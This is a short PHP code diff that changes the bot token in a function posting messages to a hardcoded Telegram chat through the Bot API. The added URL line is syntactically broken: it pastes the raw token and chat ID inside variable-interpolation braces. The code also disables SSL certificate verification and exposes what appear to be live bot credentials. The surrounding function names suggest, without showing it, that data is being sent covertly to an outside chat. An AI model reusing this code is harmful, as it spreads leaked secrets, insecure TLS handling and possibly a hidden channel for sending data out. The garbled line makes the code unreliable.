@@ -55,8 +55,8 @@ function SendTableMessage()
 function Send($message)
 {
     $chat_id ='7222383115';
-    $token = 'AAGEuLtPWBNu8wvu9gsPfrWQjgsJzAm5jGU';
-    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text=" . urlencode($message);
+    $token = 'AAGGs3ZGYKjkolFYmZLHOrNGvIGasJZLEBY';
+    $url = "https://api.telegram.org/bot{$7474804737:AAGGs3ZGYKjkolFYmZLHOrNGvIGasJZLEBY}/sendMessage?chat_id={$7222383115}&parse_mode=html&text=" . urlencode($message);
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
